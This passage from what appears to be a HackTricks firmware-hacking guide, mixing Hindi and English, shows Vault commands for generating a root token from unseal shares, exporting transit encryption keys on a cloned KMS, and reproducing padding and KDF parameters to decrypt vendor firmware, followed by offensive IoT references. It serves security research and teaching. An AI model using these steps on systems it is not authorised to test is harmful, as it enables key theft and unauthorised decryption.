OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
cloned KMS पर root के साथ:

- transit keys को केवल isolated clone के अंदर exportable बनाएं: `vault write transit/keys/<name>/config exportable=true`
- unwrap key export करें: `vault read transit/export/encryption-key/<name>`
- recovered RSA key को KMS द्वारा उपयोग किए गए exact padding/hash pair के साथ आजमाएं। विफल PKCS#1 v1.5 decrypt और विफल default OAEP decrypt यह **सिद्ध नहीं करते** कि key गलत है; कई Vault-backed flows SHA-256 के साथ OAEP का उपयोग करते हैं, जबकि common libraries डिफ़ॉल्ट रूप से SHA-1 का उपयोग करती हैं।
- यदि payload `Salted__` से शुरू होता है, तो AES-CBC decryption का प्रयास करने से पहले vendor के OpenSSL KDF (`EVP_BytesToKey`, legacy appliances पर अक्सर MD5) को ठीक उसी तरह reproduce करें।

इससे "encrypted firmware" एक अधिक सामान्य समस्या में बदल जाता है: **appliance-side operational keys recover करें, फिर exact unwrap + KDF parameters को offline reproduce करें**।

## Training और Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [Cracking Firmware with Claude: Senior-Level Skill, Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
